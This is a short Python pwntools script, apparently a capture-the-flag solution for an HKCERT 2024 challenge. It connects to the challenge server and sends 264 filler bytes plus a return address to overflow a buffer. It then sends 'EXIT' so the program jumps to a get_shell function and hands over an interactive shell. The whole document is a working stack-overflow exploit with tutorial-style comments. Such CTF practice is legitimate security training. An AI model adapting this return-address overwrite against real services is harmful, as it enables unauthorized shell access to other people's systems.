from pwn import *

# context.log_level = "CRITICAL" # minimize logging

io = remote("c64-chatggt.hkcert24.pwnable.hk", 1337, ssl=True)
# io = process("./chal")
io.recvuntil(
    "Question (Input EXIT to leave the chat):"
)  # wait until we receive this text... which is when we need to response

payload = b"a" * 264 + p64(0x4011FB)  # craft what we are going to send
io.send(payload)  # send the payload out
# gdb.attach(io)
io.recvuntil(
    "Question (Input EXIT to leave the chat):"
)  # again... wait until we receive this text.
io.send("EXIT")  # Input "EXIT" to leave the loop, and the `start_chat` function

# program will leave the `start_chat` function, then jump to `get_shell` function

io.interactive()  # You can interact with the shell and get a flag now
